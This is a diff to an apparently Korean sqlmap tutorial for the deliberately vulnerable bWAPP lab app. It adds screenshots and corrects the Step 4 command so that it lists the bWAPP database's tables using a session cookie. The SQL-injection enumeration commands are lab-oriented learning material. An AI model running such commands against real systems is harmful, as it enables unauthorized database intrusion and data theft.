@@ -193,13 +193,18 @@ security_level = 0
 --cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0" --dbs
 ```
 
+![sqlmap3](https://user-images.githubusercontent.com/76420201/106386065-88ac8d80-6416-11eb-98e2-7c561cb7fe1a.gif)
+
 ---
 
 **Step 4. bWAPP 테이블 목록 확인**
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo sqlmap -u "http://bee-box/bWAPP/sqli_1.php?title=man&action=search" \
---cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0 -D bWAPP"
+--cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0" -D bWAPP --tables
 ```
 
+![sqlmap4](https://user-images.githubusercontent.com/76420201/106386066-89ddba80-6416-11eb-9234-989108405092.gif)
+
 </details>
+
